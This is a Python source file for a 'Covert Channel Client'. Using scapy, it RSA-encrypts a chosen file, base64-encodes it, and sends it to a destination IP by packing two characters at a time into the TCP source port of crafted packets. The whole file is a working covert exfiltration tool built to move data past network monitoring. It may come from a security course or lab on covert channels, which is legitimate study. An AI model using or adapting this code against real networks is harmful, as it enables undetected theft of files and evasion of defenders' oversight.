import logging
import  hashlib
import base64
# don't output warnings from scapy, kthx
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from random import randint
import msgdef_pb2 as msg
import argparse
import time
import os
import sys
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import binascii
# globals
global maxPort
global lastPosition
global fileSize
global args
maxPort = 65535
asciiMax = 127
lastPosition = 0
fileSize = 0
# start of execution

# createPacketTwo - takes in two ASCII characters
# Turns both characters into binary strings, concatenates the strings
# and turns the result into an integer value. It then creates a TCP packet
# and sets the source port as the difference between 65535 and the integer.
# Returns a TCP packet created by scapy.
def createPacketTwo(char1, char2):
  # get the binary values of both chars without the binary string indicator
  binChar1 = bin(ord(char1))[2:].zfill(8)
  binChar2 = bin(ord(char2))[2:].zfill(8)
  #print (binChar1 + binChar2)
  # get the integer value of the concatenated binary values
  intPortVal = int(binChar1 + binChar2, 2)
  #print ("bin value " + str((bin(intPortVal))))
  # craft the packet
  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort - intPortVal, flags = "E")
  return packet

# create a packet when we only have 1 character remaining in the file
# works exactly the same as createPacketTwo except we only have one character
# returns a TCP packet created by scapy.
def createPacketOne(char):
  # get the binary value of the character
  binChar = bin(ord(char))[2:].zfill(8)
  #print (binChar)
  #get the integer value of that binary value
  intPortVal = int(binChar, 2)
  # craft the packet
  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort -intPortVal, flags = "E")
  return packet

# readOneByte - takes in a file descriptor of an open file
# accesses the global lastPosition variable, and seeks to that byte offset
# within the file.  Then, read one byte from the file and update the lastPosition.
# Returns the byte read from the file.
def readOneByte(fileDescriptor):
  global lastPosition
  byte = fileDescriptor[lastPosition]
  lastPosition = lastPosition + 1
  return byte

# sendPackets - loops through the file specified as a command line argument.
# Reads each byte from the file, calls the appropriate packet creation function
# and sends each packet.  Between each send there is a sleep for a randomized amount
# of time within a range, also set as a command line argument.

#password=str(args.pword)
#initial=str(args.iv)
def encryptMessage():
  keyFile = open("rsa.pub", 'rb')
  data = keyFile.read()
  keyString = open(args.path,"rb")
  pubKey = RSA.import_key(data)
  messageEncryptor = PKCS1_OAEP.new(pubKey)
  encryptedMessage = messageEncryptor.encrypt(keyString.read())
  return encryptedMessage

def msgHash(encryptedMessage):
  m = hashlib.sha512()
  m.update(encryptedMessage)
  return m.digest()

def sendPackets(message):
  fileSize = len(message)
  global lastPosition
  while lastPosition < fileSize:
    if lastPosition == fileSize - 1:
      # the next byte we read contains the last character in the file
      char = readOneByte(message)
      #print(char)
      packet = createPacketOne(char)
    else:
      # there is at least 2 characters left in the file
      char1 = readOneByte(message)
      char2 = readOneByte(message)
      #print(char1, char2)
      packet = createPacketTwo(char1, char2)

    # scapy send
    """obj = AES.new(password, AES.MODE_CBC,initial)
    ciphertext = obj.encrypt(packet)"""
    #send(packet)
    send(packet, verbose=False)
    #print ("sport: " + str(packet.sport))
    #return ciphertext
    #time.sleep(randint(1,int(args.sendInterval)))

parser = argparse.ArgumentParser(description='Covert Channel Client')
parser.add_argument('-f'
                   , '--file'
                   , dest='path'
                   , help='absolute path to file to watch.'
                   , required=True)
parser.add_argument('-d'
                   , '--destination'
                   , dest='destIp'
                   , help='IP address to covertly send data too.'
                   , required=True)
"""parser.add_argument('-p'
                   , '--pass'
                   , dest='pword'
                   , help='Password for encryption'
                   , required=True)
parser.add_argument('-i'
                   , '--iv'
                   , dest='iv'
                   , help='IV for the encryption.'
                   , required=True)"""
parser.add_argument('-t'
                   , '--time'
                   , dest='sendInterval'
                   , help='Max interval to wait between sends, in seconds.'
                   , required=True)
args = parser.parse_args()

response = msg.ExpressionResponse()
response.encrypt = encryptMessage()
response.hash = msgHash(response.encrypt)
response_string = response.SerializeToString()
response_string = base64.b64encode(response_string)
# 1st
print(response_string)
fileSize = len(response_string)
print(fileSize)
sendPackets(str(fileSize)+"\n")
lastPosition = 0
sendPackets(response_string.decode())
lastPosition = 0

# 2nd
print(response_string)
fileSize = len(response_string)
print(fileSize)
sendPackets(str(fileSize)+"\n")
lastPosition = 0
sendPackets(response_string.decode())
lastPosition = 0